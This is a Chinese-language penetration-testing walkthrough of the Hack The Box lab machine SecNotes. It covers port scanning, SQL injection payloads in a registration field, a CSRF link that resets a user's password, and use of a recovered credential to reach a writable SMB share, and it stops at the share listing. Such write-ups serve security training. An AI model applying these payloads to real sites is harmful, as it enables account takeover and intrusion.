# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

查看开放端口
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap --open 10.10.10.97 -p-                                                                               130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 22:58 EST
Nmap scan report for 10.10.10.97
Host is up (0.31s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 605.16 seconds

```

查看端口详细信息
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap -sV -Pn -A -O 10.10.10.97 -p 80,445,8808
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 23:36 EST
Nmap scan report for 10.10.10.97
Host is up (0.27s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-01-10T20:36:21-08:00
|_clock-skew: mean: 2h39m53s, deviation: 4h37m10s, median: -8s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-11T04:36:20
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   290.77 ms 10.10.14.1
2   290.96 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds

```

# 445

没有用户凭证什么都看不了，等我们收集到一个用户登录信息再回来。

# 80

目录爆破
```
┌──(root㉿ss)-[~/htb]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.97                                                                       

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.97/_22-06-02_05-07-26.txt

Error Log: /root/dirsearch/logs/errors-22-06-02_05-07-26.log

Target: http://10.10.10.97/

[05:07:26] Starting:         
[05:07:46] 500 -    1KB - /auth.php                                           
[05:07:50] 302 -    0B  - /contact.php  ->  login.php                       
[05:07:52] 500 -    1KB - /db.php                                           
[05:07:57] 302 -    0B  - /home.php  ->  login.php                          
[05:08:01] 200 -    1KB - /login.php                                        
[05:08:02] 302 -    0B  - /logout.php  ->  login.php                        
[05:08:11] 200 -    2KB - /register.php    
```


这个cms可以自由注册

我们尝试注册一个账户，看到contact.php暴露出一个用户名：tyler
```
Contact Us

Please enter your message
To: tyler@secnotes.htb
Message:
```

我们尝试使用tyler的名称注册，提示
```
This username is already taken.
```

说明是存在这个用户的，说不定登录进去以后还能看到tyler的留言或者登录smb，我们现在需要tyler的密码

## sql注入

注册时的名字存在sql注入，字段：username

注入的结果需要登录进去以后才能回显

且这个字段的字符长度，经过测试最多只允许50个字符

注入格式
```
admin' or 1=1 #
```

回显字段:2,3,4都会回显
```
admin ' union select 1,2,3,4# 
2, 3 ,4
```

数据库名字和版本
```
admin ' union select 1,database(),3,version()#  
secnotes, 3 ,8.0.11
```

当前用户
```
admin ' union select 1,system_user(), 3 ,user()# 
secnotes@localhost,3,secnotes@localhost
```

想要获取表名，但是超过了username的长度限制.



# XSRF

什么是XSRF?
维基这样解释：
> 跨站请求伪造，也被称为one-click attack 或者 session riding，通常缩写为CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。


## contact.php
这个页面要求我们输入一段文本，当我们构造一个特殊的payload，比如本机的http链接
```
http://10.10.16.4/any
```

点击发送以后，在我们本机的web服务可以看见有访问的请求

```
┌──(root💀kali)-[~/htb/SecNotes]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [02/Jun/2022 06:05:55] code 404, message File not found
10.10.10.97 - - [02/Jun/2022 06:05:55] "GET /any HTTP/1.1" 404 -

```

也就是说无论我们发送什么链接，用户tyler都会去点击

这个有点客户端攻击的意思了。

## change_pass.php

在修改密码页面，只需要输入两个参数，password和confirm_password

在form表单里是通过POST请求的，那能不能使用GET请求呢？

使用burp截断POST
```
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/change_pass.php
Cookie: PHPSESSID=rsiqvoieb29ln9kke0ab561bve
Upgrade-Insecure-Requests: 1


password=654321&confirm_password=654321&submit=submit
```


我们构造一个payload测试

```
curl -v --cookie "PHPSESSID=rsiqvoieb29ln9kke0ab561bve" 'http://10.10.10.97/change_pass.php?password=654321&confirm_password=654321&submit=submit'
```

然后使用```admin:654321```登陆

发现可以成功修改密码

现在我们只需要把下面的payload放在contact.php的表单里，tyler点击以后，我们就可以使用tyler的账号登录这个web app了

```
http://10.10.10.97/change_pass.php?password=654321&confirm_password=654321&submit=submit
```


现在使用```tyler:654321```可以登录到后台

发现3个note

1. Mimi's Sticky Buns[2018-06-21 09:47:17]
```
Ingredients
    For Dough
        1 heaping Tbs. (1 pkg) dry yeast
        1/4 c warm water
        scant 3/4 c buttermilk
        1 egg
        3 c flour
        1/4 shortening
        1/4 c sugar
        1 tsp baking powder
        1 tsp salt
    For Filling
        Butter
        Cinnamon
        1/4 c sugar
    For Sauce
        1/4 c butter
        1/2 c brown sugar
        2 Tbs maple syrup

Instructions
        In 9" sq pan, melt butter, and stir in brown sugar and syrup.
        In a large mixing bowl dissolve yeast in warm water.
        Add buttermilk, egg, half of the flour, shortening, sugar, baking powder, and salt.
        Blend 1/2 min low speed, then 2 min med speed.
        Stir in remaining flour and kneed 5 minutes.
        Roll dough into rectangle about the size of a cookie sheet. Spread with butter, sprinkle with 1/4 c sugar and generously with cinnamon.
        Roll up, and cut into 9 slices.
        Place in 9" pan in sauce.
        Let rise until double in size, about 1-1.5 hours.
        Bake 25-30 min at 375.
```

2. Years[2018-06-21 09:47:54]
```
1957, 1982, 1993, 2005, 2009*, and 2017
```


3. new site[2018-06-21 13:13:46]
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

第三个post暴露了一个用户凭证


cme测试登录smb成功
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'                                                        
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 

```


可以读写一个new-site的文件夹
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97                                                                                                                                                                            1 ⨯
[+] IP: 10.10.10.97:445 Name: 10.10.10.97                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE

```


登录new-site，经测试就是8808站点
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# smbclient -U "tyler"  \\\\10.10.10.97\\new-site                                                                 
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun  2 06:25:44 2022
  ..                                  D        0  Thu Jun  2 06:25:44 2022
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3354781 blocks available
smb: \> 

```